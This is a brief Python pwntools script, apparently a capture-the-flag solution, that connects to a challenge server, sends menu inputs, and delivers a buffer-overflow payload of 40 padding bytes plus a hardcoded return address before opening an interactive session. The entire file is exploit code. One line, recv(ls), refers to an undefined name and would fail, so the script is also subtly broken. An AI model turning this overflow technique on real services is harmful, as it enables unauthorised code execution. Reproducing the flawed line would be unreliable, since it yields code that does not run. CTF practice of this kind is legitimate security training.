from pwn import *

host = "challs.nusgreyhats.org"
port = 32345

remote = connect(host, port)

remote.sendline("1")
remote.sendline("1")
remote.sendline("1")

print(remote.recv())

payload = b'A' * 40 + p64(0x0000000000401236)
remote.sendline(payload)
print(remote.recv(ls))
remote.interactive()